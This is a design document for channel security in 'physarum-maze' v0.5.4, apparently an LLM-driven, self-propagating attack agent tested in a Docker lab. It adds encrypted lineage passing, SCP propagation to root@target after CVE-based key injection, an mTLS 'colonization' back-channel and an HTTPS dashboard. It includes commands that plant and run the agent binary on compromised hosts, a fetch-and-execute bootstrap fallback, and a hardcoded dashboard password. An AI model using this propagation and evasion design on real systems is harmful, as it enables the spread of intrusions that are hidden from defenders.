# Channel Security Design — physarum-maze v0.5.4

Design reference for the four channel security modules shipped in v0.5.4 (Issues #187–#190). These modules address the main OPSEC exposure vectors present before Gate N without requiring the full Gate N.1–N.7 PKI stack.

---

## Motivation

Before v0.5.4, the organism had three open exposure vectors:

| Vector | Risk |
|---|---|
| `--lineage-b64` on the command line | Full attack path readable via `ps aux` on a compromised host |
| Bootstrap delivered via `wget http://seed:8001/bootstrap.sh` | Unencrypted HTTP channel; seed exposed an additional port |
| Back-channel `POST /report-colonization` over plain HTTP | Reports sent in clear text; no proof of agent identity |
| Browser dashboard served over plain HTTP | Credentials (`admin:Physarum-M@z&`) travel in base64 over cleartext |

The four issues close these vectors independently and cumulatively. Each can be deployed standalone; together they form a complete channel security layer.

---

## Issue #187 — AES-256-GCM lineage encryption

**Module:** `crates/physarum-maze/src/lineage_crypto.rs`

### Problem

The lineage JSON — which contains the full attack path, hop history, LLM attempt records, and (after #189) TLS client certs — was base64-encoded and passed on the command line as `--lineage-b64`. Any process on the compromised host could read the full path via `ps aux`.

### Design

```
seed startup
  → lineage_crypto::init_seed()
      → generate random 32-byte AES-256-GCM key
      → store in process-global OnceLock

before propagation (llm_loop.rs)
  → serialize lineage to JSON
  → encrypt with AES-256-GCM (random 12-byte nonce prepended to ciphertext)
  → base64-encode the nonce+ciphertext blob
  → pass as --lineage-b64 to the propagated agent

propagated agent startup
  → lineage_crypto::init_from_env()
      → read AES key from PHYSARUM_LINEAGE_KEY env var
        (injected via the SSH session before the binary is executed)
  → decrypt --lineage-b64 on first access
```

### Key delivery

The AES key is **not** on the command line. It is injected via the SSH session already established to plant the pubkey:

```bash
# Conceptual flow (executed by llm_loop.rs before SCP):
ssh root@target "export PHYSARUM_LINEAGE_KEY=<hex_key>"
scp physarum-maze root@target:/tmp/physarum/physarum-maze
ssh root@target "PHYSARUM_LINEAGE_KEY=<hex_key> /tmp/physarum/physarum-maze --lineage-b64 <encrypted_b64> ..."
```

The key is visible in the SSH session's environment on the target, but not in `ps aux` output for other processes.

### Security properties

- Full lineage content is opaque to local process listing
- Key derivation is per-seed-run — compromise of one lineage does not expose others
- Nonce is random per encryption — same lineage JSON produces different ciphertext on every propagation

---

## Issue #188 — SCP bootstrap delivery

**Module:** `crates/physarum-maze/src/llm_loop.rs` (bootstrap execution path)

### Problem

The previous delivery mechanism served a `bootstrap.sh` script + binary over HTTP from the seed on port `:8001`. This required:
- An additional open port on the seed
- An unencrypted HTTP channel
- `wget` or `curl` available on the target

### Design

```
After pubkey injection via CVE exploit:

  llm_loop.rs (ScpUpload step)
    → scp -i ephemeral_key physarum-maze root@target:/tmp/physarum/physarum-maze
    → ssh -i ephemeral_key root@target "chmod +x /tmp/physarum/physarum-maze && nohup ..."

  HTTP fallback (OgnlExec targets only):
    → if SCP fails AND plan contains an OgnlExec step:
        → start ephemeral HTTP server on :8001 (127.0.0.1 only, not 0.0.0.0)
        → OgnlExec step fetches and executes bootstrap.sh
        → HTTP server stopped immediately after
```

### Security properties

- Primary path (SCP) uses the encrypted SSH channel exclusively — no additional ports
- HTTP fallback is restricted to OgnlExec targets where SCP is architecturally impossible
- The ephemeral HTTP server, when used, binds only for the duration of the OgnlExec request

---

## Issue #189 — mTLS back-channel

**Module:** `crates/physarum-maze/src/tls_store.rs`, `crates/physarum-maze/src/server.rs`

### Problem

`POST /report-colonization` was an unauthenticated plain HTTP endpoint. Any process on the network could send fake colonization reports to the seed.

### Architecture

```
seed startup
  → TlsStore::new()
      → generate ephemeral CA (KeyPair + CertificateParams, self-signed)
      → generate mTLS server cert (SAN = "physarum-seed", signed by CA)
      → export CA PEM to /tmp/physarum/ca.pem

before propagation (llm_loop.rs)
  → TlsStore::issue_agent_cert(agent_ip)
      → unique client cert per agent, signed by ephemeral CA
      → (cert_pem, key_pem) embedded in AES-GCM lineage

propagated agent startup
  → read ca_cert_pem + agent_cert_pem + agent_key_pem from lineage
  → build reqwest::Client with:
      identity(cert + key)         # client cert for mTLS handshake
      tls_root_certificate(ca)     # trust only the ephemeral CA
      danger_accept_invalid_hostnames(true)  # skip DNS SAN check (IP-only routing)

seed mTLS server (port+1)
  → axum-server 0.8 + rustls
  → WebPkiClientVerifier — rejects any connection without a valid client cert
  → only accepts certs signed by the ephemeral CA generated at seed startup
```

### Distinguished Names

All three certs carry explicit `DistinguishedName`:

| Cert | CN | O |
|---|---|---|
| CA | Physarum Attack Path CA | Physarum Attack Path |
| mTLS server (physarum-seed) | physarum-seed | Physarum Attack Path |
| Browser (localhost) | Physarum Attack Path | Physarum Attack Path |

### Port assignment

```
--server PORT      →  browser HTTP/HTTPS (no client cert required)
--server PORT + 1  →  mTLS back-channel (client cert mandatory)
```

Example with `--server 8443 --tls`:
- `https://0.0.0.0:8443/` — browser dashboard (HTTPS, no client cert)
- `https://0.0.0.0:8444/report-colonization` — mTLS back-channel

### Security properties

- Only agents that received a client cert from the seed can report
- Client cert is unique per agent IP — compromised cert cannot be reused by another agent
- CA is ephemeral — a new run generates a new CA and invalidates all previous client certs
- `WebPkiClientVerifier` enforces cert validation at the TLS layer before the HTTP handler is reached

---

## Issue #190 — HTTPS browser dashboard

**Module:** `crates/physarum-maze/src/tls_store.rs`, `crates/physarum-maze/src/server.rs`, `crates/physarum-maze/src/main.rs`

### Problem

The browser dashboard was served over plain HTTP. HTTP Basic Auth credentials (`admin:Physarum-M@z&`) travelled in base64 without encryption. In a Docker or remote lab, anyone with network access to the seed could intercept credentials and the live attack path graph.

### Design

```
--tls flag (or PHYSARUM_TLS=true env var)
  → TlsStore::new() generates browser cert (SAN = localhost + 127.0.0.1)
  → server::start() called with Some(Arc<TlsStore>)
      → axum-server 0.8 bind_rustls on 0.0.0.0:PORT
      → rustls ServerConfig with no client auth (browsers don't have client certs)
  → browser connects to https://localhost:PORT/
      → first visit: "Advanced → Proceed" (self-signed, not in OS trust store)
      → optional: import /tmp/physarum/ca.pem to silence warning
```

### SAN configuration

The browser cert includes two Subject Alternative Names so browsers accept connections to both `localhost` and `127.0.0.1`:

```rust
CertificateParams::new(vec!["localhost".to_string()])
    .subject_alt_names.push(SanType::IpAddress(IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1))));
```

### Docker binding

The server binds `0.0.0.0` (not `127.0.0.1`) so Docker's port-forwarding bridge can reach the container. Binding `127.0.0.1` inside a Docker container makes the port unreachable from the host, producing `ERR_CONNECTION_RESET`.

### CA export

```
/tmp/physarum/ca.pem
```

Written at startup. To silence the browser warning permanently:

```bash
# macOS
sudo security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /tmp/physarum/ca.pem

# Linux (curl-based)
sudo cp /tmp/physarum/ca.pem /usr/local/share/ca-certificates/physarum-ca.crt
sudo update-ca-certificates

# Extract from running Docker container
docker exec physarum-pf6-agent cat /tmp/physarum/ca.pem > /tmp/physarum-ca.pem
```

### pf6-lab.sh integration

```bash
./docker/pf6-lab.sh --phase2   # exports PHYSARUM_TLS=true + PHYSARUM_SERVER_PORT=8443
                                # opens https://localhost:8443/
```

Phase 1 is unchanged (`PHYSARUM_TLS=false`, `http://localhost:8080/`).

### Security properties

- HTTP Basic Auth credentials are now encrypted in transit
- Self-signed cert provides transport encryption without requiring a CA infrastructure
- Ephemeral cert — rotated every seed run, cannot be extracted and reused after the lab stops
- Browser cert and mTLS cert share the same CA — one CA to trust for full lab access

---

## Module summary

| Module | File | Key type |
|---|---|---|
| AES-256-GCM lineage crypto | `crates/physarum-maze/src/lineage_crypto.rs` | Symmetric (per-run AES key) |
| Ephemeral PKI store | `crates/physarum-maze/src/tls_store.rs` | Asymmetric (ephemeral CA + issued certs) |
| mTLS + HTTPS server | `crates/physarum-maze/src/server.rs` | TLS (axum-server 0.8 + rustls) |
| CLI flags | `crates/physarum-maze/src/main.rs` | `--tls`, `PHYSARUM_TLS`, `PHYSARUM_SERVER_PORT` |
| Lab runner | `docker/pf6-lab.sh` | Phase 2 environment setup |

---

## Validated lab run (v0.5.4)

```
./docker/pf6-lab.sh --phase2

PHYSARUM_TLS=true
PHYSARUM_SERVER_PORT=8443
Dashboard: https://localhost:8443/

Back-channel results:
  172.21.0.4  depth=1  confidence=0.9  mTLS ✔
  172.21.0.3  depth=2  confidence=0.9  mTLS ✔
  172.21.0.5  depth=3  confidence=0.9  mTLS ✔
```

All three targets reported via mTLS with HTTPS active. Cert CN/O visible in browser as "Physarum Attack Path".
